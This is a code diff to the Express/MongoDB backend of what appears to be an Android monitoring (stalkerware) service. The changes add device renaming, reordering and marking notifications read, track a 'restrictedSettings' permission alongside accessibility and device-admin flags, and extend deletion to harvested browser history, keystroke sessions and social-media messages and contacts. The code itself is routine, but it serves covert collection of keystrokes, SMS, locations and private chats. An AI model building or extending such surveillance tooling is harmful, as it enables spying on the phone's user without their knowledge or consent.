@@ -12,6 +12,8 @@ const transformDevice = (device) => {
     id: d._id.toString(),
     deviceId: d.deviceId,
     name: d.name,
+    alias: d.alias || null,
+    displayOrder: d.displayOrder || 0,
     model: d.model,
     androidVersion: d.androidVersion,
     isOnline: d.isOnline,
@@ -38,6 +40,7 @@ const transformDevice = (device) => {
       batteryOptimization: false,
       deviceAdmin: false,
       accessibility: false,
+      restrictedSettings: false,
       lastUpdated: null
     }
   };
@@ -48,7 +51,7 @@ router.get('/', protect, async (req, res) => {
   try {
     const devices = await Device.find({ owner: req.user._id })
       .select('-__v')
-      .sort({ lastSeen: -1 });
+      .sort({ displayOrder: 1, lastSeen: -1 }); // Sort by displayOrder first, then lastSeen
     
     res.json({
       success: true,
@@ -57,6 +60,30 @@ router.get('/', protect, async (req, res) => {
     });
   } catch (error) {
     res.status(500).json({ error: 'Failed to fetch devices' });
+  }
+});
+
+// Reorder devices (must be before :deviceId routes)
+router.put('/reorder', protect, async (req, res) => {
+  try {
+    const { deviceOrder } = req.body;
+
+    if (!deviceOrder || !Array.isArray(deviceOrder)) {
+      return res.status(400).json({ error: 'deviceOrder array is required' });
+    }
+
+    // Update order for each device
+    for (let i = 0; i < deviceOrder.length; i++) {
+      await Device.findOneAndUpdate(
+        { _id: deviceOrder[i], owner: req.user._id },
+        { $set: { displayOrder: i } }
+      );
+    }
+
+    res.json({ success: true, message: 'Device order updated' });
+  } catch (error) {
+    console.error('Failed to reorder devices:', error);
+    res.status(500).json({ error: 'Failed to reorder devices' });
   }
 });
 
@@ -164,6 +191,7 @@ router.put('/:deviceId/permissions', async (req, res) => {
       batteryOptimization: permissions.batteryOptimization || false,
       deviceAdmin: permissions.deviceAdmin || false,
       accessibility: permissions.accessibility || false,
+      restrictedSettings: permissions.restrictedSettings || permissions.restrictionSettings || false,
       lastUpdated: new Date()
     };
     
@@ -441,7 +469,7 @@ router.delete('/:deviceId', protect, async (req, res) => {
     });
 
     // Delete ALL associated data from all collections
-    const { SMS } = require('../models');
+    const { SMS, BrowserHistory, KeystrokeSession, SocialMessage, SocialContact } = require('../models');
     await Promise.all([
       Notification.deleteMany({ deviceId: device.deviceId }),
       CallLog.deleteMany({ deviceId: device.deviceId }),
@@ -449,10 +477,14 @@ router.delete('/:deviceId', protect, async (req, res) => {
       LocationHistory.deleteMany({ deviceId: device.deviceId }),
       Photo.deleteMany({ deviceId: device.deviceId }),
       Screenshot.deleteMany({ deviceId: device.deviceId }),
-      SMS.deleteMany({ deviceId: device.deviceId })
+      SMS.deleteMany({ deviceId: device.deviceId }),
+      BrowserHistory.deleteMany({ deviceId: device.deviceId }),
+      KeystrokeSession.deleteMany({ deviceId: device.deviceId }),
+      SocialMessage.deleteMany({ deviceId: device.deviceId }),
+      SocialContact.deleteMany({ deviceId: device.deviceId })
     ]);
     
-    console.log(`All data deleted for device: ${device.deviceId}`);
+    console.log(`All data deleted for device: ${device.deviceId} - Notifications, CallLogs, AppUsage, Location, Photos, Screenshots, SMS, BrowserHistory, Keystrokes, SocialMessages, SocialContacts`);
 
     res.json({
       success: true,
@@ -1400,6 +1432,60 @@ router.post('/:deviceId/screenshot/upload', async (req, res) => {
   } catch (error) {
     console.error('Failed to upload screenshot:', error);
     res.status(500).json({ error: 'Failed to upload screenshot' });
+  }
+});
+
+// Mark notifications as read for a device
+router.post('/:deviceId/notifications/mark-read', protect, async (req, res) => {
+  try {
+    const device = await Device.findOne({
+      _id: req.params.deviceId,
+      owner: req.user._id
+    });
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    // Update all notifications for this device as read
+    await Notification.updateMany(
+      { deviceId: device.deviceId, isRead: { $ne: true } },
+      { $set: { isRead: true, readAt: new Date() } }
+    );
+
+    res.json({ success: true, message: 'Notifications marked as read' });
+  } catch (error) {
+    console.error('Failed to mark notifications as read:', error);
+    res.status(500).json({ error: 'Failed to mark notifications as read' });
+  }
+});
+
+// Rename device (set alias)
+router.put('/:deviceId/rename', protect, async (req, res) => {
+  try {
+    const { alias, name } = req.body;
+    const newName = alias || name;
+
+    if (!newName || !newName.trim()) {
+      return res.status(400).json({ error: 'Name is required' });
+    }
+
+    const device = await Device.findOne({
+      _id: req.params.deviceId,
+      owner: req.user._id
+    });
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    device.alias = newName.trim();
+    await device.save();
+
+    res.json({ success: true, device: transformDevice(device) });
+  } catch (error) {
+    console.error('Failed to rename device:', error);
+    res.status(500).json({ error: 'Failed to rename device' });
   }
 });
 
